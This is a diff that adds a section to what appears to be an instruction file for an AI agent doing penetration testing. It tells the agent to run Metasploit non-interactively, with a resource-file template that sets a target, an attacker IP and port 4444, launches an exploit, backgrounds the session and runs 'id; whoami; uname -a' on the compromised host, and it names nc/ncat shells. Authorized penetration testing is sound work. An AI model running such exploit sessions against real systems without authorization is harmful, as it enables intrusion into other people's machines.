@@ -52,6 +52,39 @@ Example: Launch nmap + nuclei + subfinder all at once:
 - Call 3: httpx probe → /tmp/httpx.txt (background)
 Then in next turn: read all three output files.
 
+## Interactive Processes — CRITICAL WARNING
+
+NEVER run interactive processes that wait for user input in a foreground Bash call.
+These will block until timeout (30 min) and produce no useful output:
+
+BLOCKED patterns:
+- msfconsole without resource file (waits at "msf6 >" or "meterpreter >")
+- nc / ncat without -l in a piped shell (blocks on stdin)
+- python3 / irb / node REPL
+- Any command that shows a "> " or "$ " prompt and waits for keystrokes
+
+CORRECT patterns for msfconsole:
+  # Option A: Resource file + run_in_background + poll output
+  cat > /tmp/msf.rc << 'RCEOF'
+  use exploit/...
+  set RHOSTS target
+  set LHOST attacker_ip
+  set LPORT 4444
+  run -z
+  sleep 10
+  sessions -i 1 -C "id; whoami; uname -a"
+  exit -y
+  RCEOF
+  Bash({ command: "msfconsole -q -r /tmp/msf.rc > /tmp/msf_out.txt 2>&1", run_in_background: true })
+  # Then poll: Bash({ command: "tail -30 /tmp/msf_out.txt" })
+
+  # Option B: -x with explicit exit
+  msfconsole -q -x "use exploit/...; set RHOSTS t; set LHOST a; set LPORT p; run -z; sleep 10; sessions -i 1 -C 'id'; exit -y" > /tmp/msf_out.txt 2>&1
+
+KEY: "run -z" backgrounds the session (no interactive meterpreter drop-in).
+     "exit -y" ensures msfconsole exits even if sessions are open.
+     Always redirect to a file and poll with tail.
+
 ## Other Instructions
 - Always quote paths with spaces: "path with spaces/file.txt"
 - Use absolute paths to avoid cwd confusion
